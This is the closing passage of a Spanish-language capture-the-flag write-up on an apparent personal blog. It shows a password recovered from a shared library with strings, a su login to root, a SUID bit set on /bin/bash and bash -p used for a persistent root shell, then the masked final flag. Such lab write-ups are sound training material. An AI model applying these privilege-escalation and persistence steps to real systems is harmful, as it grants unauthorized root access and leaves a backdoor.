+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /lib/libscaperoom.so | grep -i <span style="color:#e6db74">&#34;**********&#34;</span>
+</span></span><span style="display:flex;"><span>strings /lib/libscaperoom.so | grep -i <span style="color:#e6db74">&#34;secret&#34;</span>
+</span></span><span style="display:flex;"><span>strings /lib/libscaperoom.so
+</span></span><span style="display:flex;"><span>su
+</span></span><span style="display:flex;"><span>whoami
+</span></span></code></pre></div><p>Parece que leyó el contenido de esa biblioteca y buscó una cadena de caracteres, para después autenticarse como <strong>Root</strong> y aplicar un <strong>whoami</strong>. Presiento que esa cadena puede ser una contraseña.</p>
+<p>Vamos a repetir esos mismos pasos. Primero usemos <strong>strings</strong> para ver el contenido de la librería <code>/lib/libscaperoom.so</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ strings /lib/libscaperoom.so
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
+</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/proc/%d/comm
+</span></span><span style="display:flex;"><span>**********
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Acceso root concedido!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reloj detenido... Buen trabajo!!!
+</span></span><span style="display:flex;"><span>/bin/systemctl stop apagar_automatico.service
+</span></span><span style="display:flex;"><span>/bin/bash
+</span></span><span style="display:flex;"><span>:*3$<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span></code></pre></div><p>Puedes ver que existe la misma cadena.</p>
+<p>Probémosla para ver si nos permite autenticarnos como <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ su
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Acceso root concedido!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reloj detenido... Buen trabajo!!!
+</span></span><span style="display:flex;"><span>root@ctf:~# root
+</span></span></code></pre></div><p>Sí sirvió, somos <strong>Root</strong>, pero la terminal es un poco extaña.</p>
+<p>Para tener un mejor control, podemos asignarle <strong>permisos SUID</strong> a la <strong>Bash</strong> y luego usarla con privilegios para tener una sesión más estable del <strong>Root</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Ejecuta: ls -la /bin/bash</span>
+</span></span><span style="display:flex;"><span>root@ctf:~# root@ctf:~# -rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> abr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ejecuta: chmod u+s /bin/bash y luego ls -la /bin/bash</span>
+</span></span><span style="display:flex;"><span>root@ctf:~# root@ctf:~# -rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> abr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span><span style="display:flex;"><span>root@ctf:~# exit
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> abr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.0# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Aun así, podemos leer la última flag que está en la ruta <code>/root/root.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.0# cat root.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>¡ENHORABUENA, INTRÉPIDO HACKER!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Has logrado superar todos los desafíos y escapar de esta sala virtual. El tiempo no fue tu enemigo, 
+</span></span><span style="display:flex;"><span>sino tu aliado, y cada decisión te ha llevado hasta este momento.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>La clave para tu victoria es:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**********
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Esta flag es el símbolo de tu éxito y la prueba de que has alcanzado el nivel más alto de este reto. 
+</span></span><span style="display:flex;"><span>Guarda este logro con orgullo, pues no todos pueden llegar tan lejos.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Recuerda:
+</span></span><span style="display:flex;"><span>- Cada pista que descifraste fue una lección valiosa.
+</span></span><span style="display:flex;"><span>- Cada error que cometiste, una oportunidad de crecer.
+</span></span><span style="display:flex;"><span>- Cada éxito, un paso más hacia el dominio.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Esto no es el final, sino el comienzo de nuevos desafíos. ¿Estás preparado para lo que viene?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>¡Nos vemos en el próximo reto, donde tu ingenio será puesto a prueba una vez más!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================</span>
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.geeksforgeeks.org/sql/mysql-des_decrypt-function/" target="_blank" rel="noopener noreferrer">https://www.geeksforgeeks.org/sql/mysql-des_decrypt-function/</a></li><li><a href="https://medium.com/@Newbeee/mysql-enumeration-using-metasploit-msfconsole-a-practical-lab-walkthrough-a94c25e0cbde" target="_blank" rel="noopener noreferrer">https://medium.com/@Newbeee/mysql-enumeration-using-metasploit-msfconsole-a-practical-lab-walkthrough-a94c25e0cbde</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-zapp/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">ZAPP - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-reactor/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Reactor - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
